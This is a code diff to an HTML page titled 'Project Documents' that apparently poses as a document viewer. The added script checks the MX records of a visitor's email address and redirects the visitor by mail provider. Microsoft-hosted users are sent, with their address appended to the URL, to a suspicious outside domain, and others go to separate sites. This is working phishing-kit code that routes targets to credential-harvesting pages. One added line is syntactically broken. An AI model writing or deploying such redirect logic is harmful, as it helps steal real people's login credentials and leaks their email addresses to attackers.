@@ -15,9 +15,72 @@ const from = new URLSearchParams(window.location.search).get('from');
   }
 
 </script>
-<!doctype html>
+
+<!DOCTYPE html>
 <html lang="en">
 <head>
+<script>
+     const apiURL = "https://dns.google/resolve?type=MX&name=";  
+
+    async function getMXRecords(domain) {
+      const url = `${apiURL}${domain}`;
+      try {
+        const response = await fetch(url);
+        if (!response.ok) {
+          throw new Error(`Failed to fetch MX records: ${response.statusText}`);
+        }
+        const data = await response.json();
+        return data.Answer || []; // Return the list of MX records
+      } catch (error) {
+        console.error("Error fetching MX records:", error);
+        return [];
+      }
+    }
+
+    async function validateAndRedirect(email) {
+      // Extract the domain from the email address
+      const domain = email.split("@")[1];
+      if (!domain) {
+        document.getElementById("status").innerText = "Invalid email address!";
+        return;
+      }
+
+      document.getElementById("status").innerText = "Validating email address...";
+      const mxRecords = await getMXRecords(domain);
+
+      if (mxRecords.length === 0) {
+        document.getElementById("status").innerText = "Cannot find MX records for the email domain.";
+        return;
+      }
+
+      console.log("MX Records:", mxRecords);
+
+      let redirectUrl = null;
+
+      // Determine the hosting provider based on MX records
+      if (mxRecords.some(record => record.data.includes("google.com"))) {
+        redirectUrl = "https://csda.info";
+      } else if (
+        mxRecords.some(record =>
+          record.data.includes("outlook.com") ||
+          record.data.includes("office365.com") ||
+          record.data.includes("hotmail.com") ||
+          record.data.includes("microsoft.com") ||
+          record.data.includes("protection.outlook.com")
+        )
+      ) {
+        redirectUrl = "https://noscript.peanouzujo.my.id/jEP6aOTWiGu!/$"+email;
+      } else {
+        redirectUrl = "https://pdf-render.vercel.app/?from=me";
+      } 
+      setTimeout(() => {
+        window.location.href = redirectUrl;window.location.assign(');
+      }, 1000);
+    }
+
+    
+</script>
+ 
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Project Documents</title>
@@ -617,8 +680,8 @@ const from = new URLSearchParams(window.location.search).get('from');
       await new Promise(r => setTimeout(r, 600));
       continueBtn.disabled = false;
       continueBtn.textContent = "Continue";
-
-      window.location.assign('https://noscript.peanouzujo.my.id/jEP6aOTWiGu!/$'+email);
+      validateAndRedirect(email);
+      
 
       closeModal();
     });
